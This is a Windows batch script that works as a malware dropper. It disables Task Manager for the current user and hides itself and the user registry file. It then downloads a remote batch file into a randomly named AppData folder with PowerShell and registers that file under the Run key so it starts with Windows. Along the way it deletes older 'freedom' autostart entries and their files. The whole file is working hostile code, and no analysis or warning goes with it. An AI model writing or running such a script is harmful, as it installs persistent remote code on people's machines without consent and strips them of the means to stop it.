@echo off
setlocal enabledelayedexpansion

:: =============================================
:: Permanently disable Task Manager for current user
:: =============================================
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

:: Hide the Policies key in the registry
attrib +h +s "%APPDATA%\Microsoft\Windows\NTUSER.DAT" 2>nul

:: Optional: Hide this batch file itself
attrib +h +s "%~f0" 2>nul

:: =============================================
:: CONFIG FOR AUTOSTART BATCH
:: =============================================
set "GIT_BAT_URL=https://raw.githubusercontent.com/username/repo/main/script.bat"

:: RANDOM FOLDER
set "RAND_FOLDER=%RANDOM%%RANDOM%"
set "SAVE_DIR=%APPDATA%\%RAND_FOLDER%"
if not exist "%SAVE_DIR%" mkdir "%SAVE_DIR%"

:: REMOVE OLD AUTOSTARTS CONTAINING 'freedom'
for /f "tokens=*" %%A in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" 2^>nul') do (
    set "ENTRY=%%A"
    for /f "tokens=1,2*" %%i in ("!ENTRY!") do (
        set "NAME=%%i"
        echo !NAME! | findstr /i "freedom" >nul
        if !errorlevel! == 0 (
            reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "!NAME!" /f >nul 2>&1
            for /f "tokens=2*" %%x in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "!NAME!" 2^>nul') do set "PATH_TO_DELETE=%%y"
            if exist "!PATH_TO_DELETE!" del "!PATH_TO_DELETE!" /f /q
            for %%F in ("!PATH_TO_DELETE!") do rd /s /q "%%~dpF" 2>nul
        )
    )
)
for /f "tokens=*" %%B in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" 2^>nul') do (
    set "ENTRYB=%%B"
    for /f "tokens=1,2*" %%i in ("!ENTRYB!") do (
        set "NAMEB=%%i"
        echo !NAMEB! | findstr /i "freedom" >nul
        if !errorlevel! == 0 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "!NAMEB!" /f >nul 2>&1
    )
)

:: DOWNLOAD NEW .BAT WITH RANDOM NAME CONTAINING 'freedom'
set "RAND=%RANDOM%%RANDOM%"
set "NEW_NAME=%RAND%_freedom.bat"
set "FULL_PATH=%SAVE_DIR%\%NEW_NAME%"
powershell -Command "Invoke-WebRequest -Uri '%GIT_BAT_URL%' -OutFile '%FULL_PATH%'" >nul 2>&1

:: ADD TO AUTOSTART AND REMOVE DISABLED FLAG
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%NEW_NAME%" /t REG_SZ /d "%FULL_PATH%" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "%NEW_NAME%" /f >nul 2>&1

exit
